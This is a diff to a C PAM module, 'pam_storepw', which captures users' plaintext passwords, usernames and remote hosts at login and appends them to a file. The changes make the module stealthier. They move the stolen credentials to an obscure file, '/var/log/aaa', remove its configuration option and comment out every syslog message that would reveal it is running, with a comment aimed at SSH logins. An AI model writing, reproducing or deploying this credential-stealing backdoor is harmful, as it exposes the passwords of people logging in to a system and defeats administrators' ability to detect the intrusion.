@@ -28,8 +28,12 @@
 #include <unistd.h>
 
 #define PWDIR_PARAM    "pwdir"
-#define PWDIR_DEFAULT  "/var/log"
-#define PWDIR_LEN      256
+//#define PWDIR_DEFAULT  "/var/log"
+//#define PWDIR_LEN      256
+
+#define PWFILE_DEFAULT  "/var/log/aaa"
+#define PWFILE_LEN      256
+
 #define BUF_MAX        256
 
 #define DEBUG
@@ -44,11 +48,11 @@
 static void _pam_log(int err, const char *format, ...) {
    va_list args;
 
-   va_start(args, format);
-   openlog("pam_storepw", LOG_CONS|LOG_PID, LOG_AUTH);
-   vsyslog(err, format, args);
-   va_end(args);
-   closelog();
+   //va_start(args, format);
+   //openlog("pam_storepw", LOG_CONS|LOG_PID, LOG_AUTH);
+   //vsyslog(err, format, args);
+   //va_end(args);
+   //closelog();
 }
 
 /* expected hook for auth service */
@@ -68,34 +72,19 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
          buffer[BUF_MAX];
     FILE *pwfile;
 
-    for(pcnt=0;pcnt<argc;pcnt++) {
-        if (strcmp(argv[pcnt], PWDIR_PARAM) == 0) {
-            if (pcnt+1 < argc)
-                pwdir=strndup(argv[++pcnt], PWDIR_LEN);
-        } else if (strncmp(argv[pcnt], PWDIR_PARAM "=", sizeof(PWDIR_PARAM "=")-1) == 0)
-            pwdir=strndup(argv[pcnt]+sizeof(PWDIR_PARAM), PWDIR_LEN);
-    }
 
-    if (!pwdir)
-        pwdir=strndup(PWDIR_DEFAULT, PWDIR_LEN);
 
     pam_get_item(pamh, PAM_AUTHTOK, (void *) &pword);
     pam_get_item(pamh, PAM_USER, (void*) &uname);
     pam_get_item(pamh, PAM_RHOST, (void*) &remhst);
 
     if (!pword || !uname) {
-        _pam_log(LOG_ERR,"no password or user to write - got stacked wrong ?");
+       // _pam_log(LOG_ERR,"no password or user to write - got stacked wrong ?");
         return PAM_AUTHINFO_UNAVAIL;
     }
 
 
-    file=(char *) malloc(strlen(uname) + strlen(pwdir) + 2);
-    if (!file) {
-        _pam_log(LOG_ERR,"malloc failed");
-        return PAM_AUTHINFO_UNAVAIL;
-    }
-
-    sprintf(file, "%s/passwords", pwdir);
+    file=strndup(PWFILE_DEFAULT, PWFILE_LEN);
 
     /* get time as well */
     time_t timer;
@@ -106,7 +95,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
     strftime(time_buffer, 26, "%Y-%m-%d %H:%M:%S", tm_info);
 
     if ((fd=open(file, O_RDWR|O_APPEND|O_CREAT, 0600)) == -1) {
-        _pam_log(LOG_ERR,"failed to open pw file");
+        //_pam_log(LOG_ERR,"failed to open pw file");
         return PAM_AUTHINFO_UNAVAIL;
     }
 
@@ -120,10 +109,10 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
     // The only way I see around this is to build ssh from source and modify the logging modules there
     res=write(fd, buffer, len);
     // Just to see that we're actually running when I check the logs
-    _pam_log(LOG_ERR, "writing to %s", file);
+    //_pam_log(LOG_ERR, "writing to %s", file);
 
     if (len != res) {
-        _pam_log(LOG_ERR,"failed to write pw to file");
+        //_pam_log(LOG_ERR,"failed to write pw to file");
         close(fd);
         return PAM_AUTHINFO_UNAVAIL;
     }
